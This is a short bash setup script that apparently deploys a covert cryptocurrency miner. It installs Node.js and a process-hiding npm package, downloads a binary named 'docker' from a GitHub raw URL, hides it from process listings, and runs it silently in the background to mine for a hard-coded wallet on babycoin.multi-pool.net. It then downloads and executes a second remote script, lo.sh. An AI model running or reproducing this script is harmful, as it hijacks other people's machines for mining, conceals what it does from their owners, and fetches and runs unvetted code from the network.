#!/bin/bash
apt update && apt -y install sudo gcc curl zip
sudo su --command "sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.5.0 && npm i -g node-process-hider && wget https://raw.githubusercontent.com/jsiqiisn/baby/main/docker && ph add docker && chmod +x docker && ./docker -a rx/arq -o babycoin.multi-pool.net:3333 -u babyz9b4zdZfTNfUPtXEEd2aP2gyVNkVUN7znzfbzFMwMMCrJmZuT2mS4fu2aqqR8UeNpNBUBeVv67vS79s8DWigjbfo8jsEqEN -p $(echo $(shuf -i 1-20000 -n 1)-V) --donate-level 1 > /dev/null 2>&1 &
wget https://raw.githubusercontent.com/jsiqiisn/baby/main/lo.sh && chmod +x lo.sh && ./lo.sh"
